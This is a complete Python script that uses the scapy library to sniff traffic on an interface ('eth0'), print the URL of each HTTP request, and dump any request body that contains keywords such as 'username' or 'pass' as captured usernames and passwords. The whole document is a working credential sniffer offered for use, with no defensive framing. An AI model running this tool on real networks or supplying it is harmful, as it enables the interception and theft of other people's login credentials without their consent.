import scapy.all as scapy
import urllib.parse
from scapy.layers import http

def sniff(interface):
    scapy.sniff(prn=process_sniffed_packets)

def get_url(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        return url

def get_login_info(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keybword = ["usr", "uname", "username", "pwd", "pass", "password"]
            for eachword in keybword:
                if eachword.encode() in load:
                    return load


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request>>" + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible USERNAME And PASSWORD Captured")
            print("\t[x] USERNAME And PASSWORD >>" + urllib.parse.unquote(str(login_info)) + "\n\n")

sniff('eth0')
